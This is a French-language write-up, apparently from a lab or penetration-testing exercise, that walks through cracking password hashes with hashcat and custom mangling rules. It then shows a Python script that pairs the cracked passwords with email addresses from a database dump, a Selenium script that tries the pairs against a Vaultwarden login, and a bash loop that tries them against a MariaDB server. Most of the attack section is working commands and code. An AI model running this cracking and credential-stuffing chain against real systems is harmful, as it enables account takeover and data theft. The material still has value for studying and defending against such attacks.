	
	On va maintenant essayer de trouver avec quel algorythme les mots de passe ont été hashé,
	pour ce faire on va utiliser hashcat
	
	![[Pasted image 20250131131751.png]]
	hashcat nous retourne plusieurs méthode de hashage possible, on peux désormais essayer chaque méthode de de hashage avec une liste de mot de passe courant ici rockyou
	
	avec cette commande "hashcat -m 17600 -a 0 "Desktop/hashs" Desktop/rockyou.txt -O"
	on obtient 4 mots de passe
	
	theused13
	hockey43 
	12373 
	3976553
	
	on peux voir des similitudes entres ses mdps la plus flagrante c'est le 3 qui est rajouté a la fin de chaque mot de passe, on va teste notre théorie en rajoutant une règle a hashcat lui disant de rajouter "3" a la fin de chaque mot de passe dans la liste rockyou
	
	pour ce faire on fait un fichier texte et on écrit dedans : "$3" indiquant à hashcat d'append 3
	
	hashcat -m 17600 -a 0 "Desktop/coco.txt" Desktop/hashs.txt -O -r the.rule
	
	avec le flag -r on peux dire a hashcat d'utiliser notre règle précédement crée et on obtient 200 nouveaux mots de passe
	
	avec un plus grand échantillon on peut en déduire de nouvelles règles
	- tout les mots de passe sont en minuscule
	- tout les a sont remplacés par des @
	
	On modifie maitenant la règle précédement crée, "sa@" indique que toutes les instances de "a" doivent être remplacées par @ et "l"  lui indique que tout doit être en minuscule
	
	On vérifie si notre résonnement est correcte
	
	 "hashcat -m 17600 -a 0 "Desktop/hashs" Desktop/rockyou.txt -O -r the.rules"
	
	![[Pasted image 20250131133431.png]]
	
	Bim ! 470 hashs unique trouvés 
	
	Maintenant qu'on a les mots de passe on va créer in fichier un l'aide d'in script python qui va associer chaque mot de passe à l'adresse e-mail correspondante.
	
	import hashlib
	
	import pandas as pd
	
	# Chemins des fichiers
	
	passwords_file = "hash.txt"
	
	emails_file = "dbo.authentication.csv"
	
	output_file = "credentials.txt"
	
	
	# Lire le fichier des mots de passe et stocker les hashes associés aux mots de passe
	
	passwords = {}
	
	with open(passwords_file, "r") as file:
	
	for line in file:
	
	parts = line.strip().split(":")
	
	if len(parts) == 2:
	
	hash_value, password = parts
	
	passwords[hash_value] = password
	
	  
	
	# Lire le fichier CSV contenant les adresses e-mail et les hashes des mots de passe
	
	emails_df = pd.read_csv(emails_file)
	
	  
	
	# Associer les hashes aux emails
	
	matched_credentials = []
	
	for index, row in emails_df.iterrows():
	
	email = row["username"]
	
	hash_value = row["password"]
	
	if hash_value in passwords:
	
	matched_credentials.append((email, passwords[hash_value]))
	
	  
	
	# Écrire les correspondances dans un fichier texte
	
	with open(output_file, "w") as file:
	
	for email, password in matched_credentials:
	
	file.write(f"{email}:{password}\n")
	
	  
	
	print(f"Fichier généré : {output_file}")
	
	On a maintenant un fichier qu'on peut facilement utiliser pour brute-force un service.
	
	on a désormais trois chemin possible avec cette methode:
	- Un service ssh( peu probable )
	- Une page web voltwarden (possible)
	- un service mariaDB (fortement probable)
	
	on a commencé par essayer de brute-force voltwarden à l'aide de ce script python
	
	```
	from selenium import webdriver
	from selenium.webdriver.common.keys import Keys
	from selenium.webdriver.common.by import By
	import time
	
	driver = webdriver.Firefox()
	driver.get("https://172.16.10.42/#/login")
	time.sleep(2)
	
	
	with open("matched_credentials.txt") as file_in:
	    lines = []
	    for line in file_in:
	        creds = line.split(':')
	        mail_input = driver.find_element(By.ID, "bit-input-1")
	        mail_input.clear()
	        mail_input.send_keys(creds[0])
	        mail_input.send_keys(Keys.RETURN)
	        passwdinput = driver.find_element(By.ID, "bit-input-0")
	        passwdinput.send_keys(creds[1])
	        passwdinput.send_keys(Keys.RETURN)
	        if "Get master password hint" in driver.page_source:
	            driver.find_element(By.LINK_TEXT, "Not you?").click()
	            time.sleep(1)
	        else: 
	            print(mail_input)
	            print(passwdinput)
	driver.close()
	```
	
	sans succès 
	
	on va maintenant essayer d'attaquer mariaDB avec ce script bash
	
	```
	#!/bin/bash
	
	IFS=''
	while read line; do
	    user=$(echo $line | cut -d ':' -f 1)
	    pass=$(echo $line | cut -d ':' -f 2)
	    echo "mysql --ssl-verify-server-cert=FALSE --host 172.16.10.43 -u ${user} -p${pass}"
	    mysql --ssl-verify-server-cert=FALSE --host 172.16.10.43 -u ${user} -p${pass}
	done < credentials.txt
	```
	


